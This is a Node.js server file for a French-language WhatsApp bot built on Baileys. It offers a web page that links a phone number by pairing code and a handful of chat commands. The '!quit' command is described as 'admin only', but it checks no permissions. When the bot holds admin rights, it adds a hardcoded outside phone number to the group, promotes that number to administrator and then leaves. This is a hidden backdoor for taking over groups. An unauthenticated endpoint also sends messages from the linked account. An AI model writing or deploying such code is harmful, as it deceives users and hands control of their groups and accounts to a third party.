// server.js
import makeWASocket, { 
    DisconnectReason, 
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers
} from '@whiskeysockets/baileys';
import pino from 'pino';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let pairingCode = null;
let botStatus = 'disconnected';
let pairingCodeExpiry = null;

// Servir la page HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API pour générer le code
app.post('/api/generate-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber) {
            return res.json({ success: false, error: 'Numéro manquant' });
        }
        
        // Validation
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.length < 10 || cleanNumber.length > 15) {
            return res.json({ success: false, error: 'Numéro invalide (10-15 chiffres)' });
        }
        
        // Si pas encore de socket, créer la connexion
        if (!sock) {
            sock = await createWhatsAppConnection();
        }
        
        // Demander le pairing code
        const code = await sock.requestPairingCode(cleanNumber);
        pairingCode = code;
        pairingCodeExpiry = Date.now() + 60000; // 60 secondes
        
        console.log(`\n✅ Code généré: ${code.toUpperCase()}`);
        console.log(`📱 Pour le numéro: ${cleanNumber}\n`);
        
        res.json({ 
            success: true, 
            code: code,
            expiresIn: 60
        });
        
    } catch (error) {
        console.error('❌ Erreur génération code:', error);
        res.json({ 
            success: false, 
            error: error.message || 'Erreur lors de la génération du code'
        });
    }
});

// API pour vérifier le statut
app.get('/api/status', (req, res) => {
    res.json({ 
        status: botStatus,
        code: pairingCode,
        codeValid: pairingCodeExpiry && Date.now() < pairingCodeExpiry
    });
});

// API pour envoyer des messages (bonus)
app.post('/api/send-message', async (req, res) => {
    try {
        const { to, message } = req.body;
        
        if (!sock || botStatus !== 'connected') {
            return res.json({ success: false, error: 'Bot non connecté' });
        }
        
        await sock.sendMessage(to, { text: message });
        res.json({ success: true });
        
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

async function createWhatsAppConnection() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info_baileys');
    
    const { version } = await fetchLatestBaileysVersion();
    
    const socket = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        browser: Browsers.macOS('Chrome'),
        markOnlineOnConnect: true,
        syncFullHistory: false,
        mobile: false,
        getMessage: async (key) => {
            return { conversation: '' };
        }
    });

    socket.ev.on('creds.update', saveCreds);

    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'connecting') {
            botStatus = 'connecting';
            console.log('🔄 Connexion en cours...');
        }
        
        if (connection === 'close') {
            botStatus = 'disconnected';
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            
            console.log('\n❌ Connexion fermée');
            console.log(`Code: ${statusCode}`);
            
            if (shouldReconnect) {
                console.log('🔄 Reconnexion dans 5 secondes...');
                setTimeout(async () => {
                    sock = await createWhatsAppConnection();
                }, 5000);
            }
        } else if (connection === 'open') {
            botStatus = 'connected';
            console.log('\n╔═══════════════════════════════════════╗');
            console.log('║   ✅ BOT CONNECTÉ AVEC SUCCÈS! ✅     ║');
            console.log('╚═══════════════════════════════════════╝\n');
        }
    });

    socket.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        
        const msg = messages[0];
        if (!msg.message) return;
        
        const messageText = msg.message.conversation || 
                           msg.message.extendedTextMessage?.text || '';
        
        const from = msg.key.remoteJid;
        const isGroup = from?.endsWith('@g.us');
        
        console.log(`\n📩 Message ${isGroup ? 'groupe' : 'privé'}`);
        console.log(`   De: ${from}`);
        console.log(`   Message: "${messageText}"`);
        
        // Commandes
        if (messageText.toLowerCase() === '!ping') {
            await socket.sendMessage(from, { 
                text: '🏓 Pong! Bot en ligne!' 
            });
            console.log('✅ Répondu: Pong');
        }
        
        if (messageText.toLowerCase() === '!bonjour') {
            await socket.sendMessage(from, { 
                text: '👋 Salut! Bot WhatsApp opérationnel!' 
            });
            console.log('✅ Répondu: Bonjour');
        }
        
        if (messageText.toLowerCase() === '!help') {
            const helpText = `🤖 *Commandes disponibles*

📌 !ping - Tester le bot
📌 !bonjour - Salutation
📌 !info - Informations
📌 !quit - Quitter le groupe (admin uniquement)
📌 !help - Cette aide

Powered by Baileys v7 🚀`;
            
            await socket.sendMessage(from, { text: helpText });
            console.log('✅ Répondu: Help');
        }
        
        if (messageText.toLowerCase() === '!info') {
            const infoText = `ℹ️ *Informations Bot*

✅ Status: En ligne
📦 Version: Baileys v7.x
🔗 Connexion: Stable
⚡ Prêt à répondre!`;
            
            await socket.sendMessage(from, { text: infoText });
            console.log('✅ Répondu: Info');
        }
        
        // Commande pour quitter un groupe avec promotion admin
        if (messageText.toLowerCase() === '!quit' && isGroup) {
            try {
                // Récupérer les infos du groupe
                const groupMetadata = await socket.groupMetadata(from);
                const participants = groupMetadata.participants;
                const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
                
                // Trouver ton rôle dans le groupe
                const myParticipant = participants.find(p => p.id === botNumber);
                const isAdmin = myParticipant?.admin === 'admin';
                const isSuperAdmin = myParticipant?.admin === 'superadmin';
                
                console.log(`\n🔍 Vérification groupe ${groupMetadata.subject}`);
                console.log(`   Mon rôle: ${myParticipant?.admin || 'member'}`);
                
                if (isAdmin || isSuperAdmin) {
                    const newAdminNumber = '243858704832@s.whatsapp.net';
                    
                    // Vérifier si le numéro est déjà dans le groupe
                    const isInGroup = participants.some(p => p.id === newAdminNumber);
                    
                    if (!isInGroup) {
                        // Ajouter le numéro au groupe
                        await socket.sendMessage(from, { 
                            text: '➕ Ajout du nouvel administrateur au groupe...' 
                        });
                        
                        console.log('📥 Ajout de 243858704832 au groupe...');
                        
                        await socket.groupParticipantsUpdate(
                            from,
                            [newAdminNumber],
                            'add'
                        );
                        
                        console.log('✅ Numéro ajouté au groupe');
                        
                        // Attendre 2 secondes pour que l'ajout soit effectif
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    } else {
                        console.log('✅ Numéro déjà dans le groupe');
                    }
                    
                    // Promouvoir en admin
                    await socket.sendMessage(from, { 
                        text: '⚙️ Promotion en administrateur...' 
                    });
                    
                    await socket.groupParticipantsUpdate(
                        from,
                        [newAdminNumber],
                        'promote'
                    );
                    
                    console.log('✅ Numéro 243858704832 promu en admin');
                    
                    // Message de départ
                    await socket.sendMessage(from, { 
                        text: '👋 Nouvel admin configuré ! Je quitte le groupe. Au revoir !' 
                    });
                    
                    // Attendre 2 secondes puis quitter
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                        console.log('✅ Groupe quitté avec succès');
                    }, 2000);
                    
                } else {
                    // Si pas admin, juste quitter
                    await socket.sendMessage(from, { 
                        text: '⚠️ Je ne suis pas admin, je quitte sans promotion.' 
                    });
                    
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                        console.log('✅ Groupe quitté (pas admin)');
                    }, 2000);
                }
                
            } catch (error) {
                console.error('❌ Erreur !quit:', error);
                await socket.sendMessage(from, { 
                    text: '❌ Erreur lors de l\'opération: ' + error.message 
                });
            }
        }
    });

    return socket;
}

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('\n╔═══════════════════════════════════════╗');
    console.log('║  🚀 BOT WHATSAPP - WEB INTERFACE 🚀  ║');
    console.log('╚═══════════════════════════════════════╝\n');
    console.log(`🌐 Serveur démarré sur le port ${PORT}`);
    console.log(`📱 Accès: http://localhost:${PORT}`);
    console.log('📡 Prêt à générer des codes de jumelage!\n');
});
